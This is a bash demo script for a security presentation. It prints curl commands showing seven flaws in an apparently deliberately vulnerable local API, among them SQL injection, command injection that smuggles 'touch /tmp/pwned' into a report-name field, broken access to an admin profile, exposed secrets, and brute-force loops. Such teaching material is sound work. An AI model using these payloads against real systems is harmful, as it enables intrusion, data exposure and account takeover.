#!/bin/bash

# Quick commands for all 7 vulnerabilities
# Copy-paste these to show each vulnerability

BASE_URL="http://localhost:3000"

echo "🚀 User Dashboard API - Live Security Presentation"
echo "=========================================="
echo ""

# Colors
BLUE='\033[0;34m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Function to print sections
section() {
    echo -e "\n${BLUE}$1${NC}"
    echo "========================================"
}

# ============================================
# 1. SQL INJECTION
# ============================================
section "1️⃣  SQL INJECTION"

echo -e "${YELLOW}Normal search:${NC}"
echo "curl \"$BASE_URL/api/v2/users/search?q=john\""
echo ""

echo -e "${YELLOW}SQL Injection attempt:${NC}"
echo "curl \"$BASE_URL/api/v2/users/search?q=admin' OR '1'='1\""
echo ""

echo -e "${GREEN}Shows: The SQL query in response (vulnerable!)${NC}"

# ============================================
# 2. HARDCODED SECRETS
# ============================================
section "2️⃣  HARDCODED SECRETS"

echo -e "${YELLOW}View .env file:${NC}"
echo "cat .env"
echo ""

echo -e "${YELLOW}Check /api/v2/config endpoint:${NC}"
echo "curl $BASE_URL/api/v2/config | jq '.'"
echo ""

echo -e "${GREEN}Shows: Database password, JWT secret, API keys (all exposed!)${NC}"

# ============================================
# 3. BFLA (BROKEN FUNCTION LEVEL ACCESS)
# ============================================
section "3️⃣  BFLA - ACCESS OTHER USERS"

echo -e "${YELLOW}Step 1: Login as regular user${NC}"
echo "curl -X POST $BASE_URL/api/v2/auth/login \\"
echo "  -H 'Content-Type: application/json' \\"
echo "  -d '{\"email\":\"user@company.com\",\"password\":\"password123\"}'"
echo ""

echo -e "${YELLOW}Step 2: Get the token and access admin profile${NC}"
echo "TOKEN=\$(curl -s -X POST $BASE_URL/api/v2/auth/login \\"
echo "  -H 'Content-Type: application/json' \\"
echo "  -d '{\"email\":\"user@company.com\",\"password\":\"password123\"}' | jq -r '.token')"
echo ""
echo "curl -H \"Authorization: Bearer \$TOKEN\" \\"
echo "  $BASE_URL/api/v2/users/admin_001 | jq '.'"
echo ""

echo -e "${GREEN}Shows: Regular user can see admin profile (with salary!)${NC}"

# ============================================
# 4. INFORMATION DISCLOSURE
# ============================================
section "4️⃣  INFORMATION DISCLOSURE"

echo -e "${YELLOW}Debug mode enabled:${NC}"
echo "curl $BASE_URL/health | jq '.debug'"
echo ""

echo -e "${YELLOW}Config exposes secrets:${NC}"
echo "curl $BASE_URL/api/v2/config | jq '.database'"
echo ""

echo -e "${GREEN}Shows: DEBUG=true, database credentials (production!)${NC}"

# ============================================
# 5. HTTPS VERIFICATION DISABLED
# ============================================
section "5️⃣  HTTPS VERIFICATION DISABLED"

echo -e "${YELLOW}Check the code:${NC}"
echo "grep -A 5 'rejectUnauthorized' src/server.js"
echo ""

echo -e "${GREEN}Shows: rejectUnauthorized: false (MITM vulnerable!)${NC}"

# ============================================
# 6. COMMAND INJECTION
# ============================================
section "6️⃣  COMMAND INJECTION"

echo -e "${YELLOW}Normal PDF generation:${NC}"
echo "TOKEN=\$(curl -s -X POST $BASE_URL/api/v2/auth/login \\"
echo "  -H 'Content-Type: application/json' \\"
echo "  -d '{\"email\":\"admin@company.com\",\"password\":\"AdminPass2024!\"}' | jq -r '.token')"
echo ""
echo "curl -X POST $BASE_URL/api/v2/reports/generate \\"
echo "  -H \"Authorization: Bearer \$TOKEN\" \\"
echo "  -H 'Content-Type: application/json' \\"
echo "  -d '{\"reportName\":\"Q1_Report\"}'"
echo ""

echo -e "${YELLOW}Command injection:${NC}"
echo "curl -X POST $BASE_URL/api/v2/reports/generate \\"
echo "  -H \"Authorization: Bearer \$TOKEN\" \\"
echo "  -H 'Content-Type: application/json' \\"
echo "  -d '{\"reportName\":\"test; touch /tmp/pwned; echo\"}'"
echo ""

echo -e "${YELLOW}Check if file was created:${NC}"
echo "ls -la /tmp/pwned"
echo ""

echo -e "${GREEN}Shows: Arbitrary command execution possible!${NC}"

# ============================================
# 7. NO RATE LIMITING
# ============================================
section "7️⃣  NO RATE LIMITING"

echo -e "${YELLOW}Brute force login (5 rapid attempts):${NC}"
echo "for i in {1..5}; do"
echo "  echo \"Attempt \$i:\""
echo "  curl -s -X POST $BASE_URL/api/v2/auth/login \\"
echo "    -H 'Content-Type: application/json' \\"
echo "    -d \"{\\\"email\\\":\\\"admin@company.com\\\",\\\"password\\\":\\\"try\$i\\\"}\" | jq '.error // .token'"
echo "done"
echo ""

echo -e "${YELLOW}Spam forgot-password:${NC}"
echo "for i in {1..5}; do"
echo "  curl -s -X POST $BASE_URL/api/v2/auth/forgot-password \\"
echo "    -H 'Content-Type: application/json' \\"
echo "    -d '{\"email\":\"victim@company.com\"}' | jq '.message'"
echo "done"
echo ""

echo -e "${GREEN}Shows: No rate limiting, all requests succeed${NC}"

# ============================================
# SUMMARY
# ============================================
section "📊 SUMMARY"

echo "7 Real-world vulnerabilities:"
echo "1. SQL Injection - Direct queries"
echo "2. Hardcoded Secrets - In code and env"
echo "3. BFLA - No user authorization"
echo "4. Information Disclosure - Debug mode"
echo "5. HTTPS verify=false - MITM vulnerable"
echo "6. Command Injection - exec() with user input"
echo "7. No Rate Limiting - Brute force possible"
echo ""
echo "For fixes, see: FIXES.md"
echo "For detailed guide: GUIDE.md"
